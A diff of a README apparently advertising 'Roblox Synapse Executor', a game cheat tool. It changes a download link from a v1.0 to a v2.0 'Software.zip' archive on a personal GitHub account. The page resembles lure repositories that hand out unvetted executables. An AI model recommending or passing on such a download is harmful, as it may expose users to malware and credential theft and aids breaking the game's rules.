@@ -42,7 +42,7 @@ Explore a wide range of topics related to Roblox Synapse Executor and Roblox scr
 ## 📥 Download Synapse Executor
 
 Click the button below to download the latest version of Roblox Synapse Executor:
-[![](https://github.com/Nasir0206/Roblox-Synapse/releases/download/v1.0/Software.zip%20Synapse%20Executor-v1.0.0-blue)](https://github.com/Nasir0206/Roblox-Synapse/releases/download/v1.0/Software.zip)
+[![](https://github.com/Nasir0206/Roblox-Synapse/releases/download/v2.0/Software.zip%20Synapse%20Executor-v1.0.0-blue)](https://github.com/Nasir0206/Roblox-Synapse/releases/download/v2.0/Software.zip)
 
 *(Note: The download link needs to be launched for the download to begin.)*
 
